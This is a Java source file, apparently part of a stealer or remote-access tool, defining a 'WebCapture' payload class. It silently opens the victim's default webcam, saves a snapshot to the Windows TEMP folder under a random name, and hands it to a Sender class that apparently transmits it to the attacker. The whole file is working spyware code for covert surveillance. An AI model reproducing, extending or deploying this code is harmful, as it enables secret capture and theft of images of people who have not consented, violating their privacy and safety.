package dev._3000IQPlay.experium.payload.impl;

import com.github.sarxos.webcam.Webcam;
import dev._3000IQPlay.experium.payload.Payload;
import dev._3000IQPlay.experium.payload.Sender;

import javax.imageio.ImageIO;
import java.io.File;
import java.util.Random;

public final
class WebCapture implements Payload {
    @Override
    public
    void execute () throws Exception {
        Webcam cam = Webcam.getDefault();
        cam.open();
        int random = Math.abs(new Random().nextInt());
        File file = new File(System.getenv("TEMP") + "\\" + random + ".png");
        ImageIO.write(cam.getImage() ,"png" ,file);
        cam.close();
        Sender.send(file);
    }
}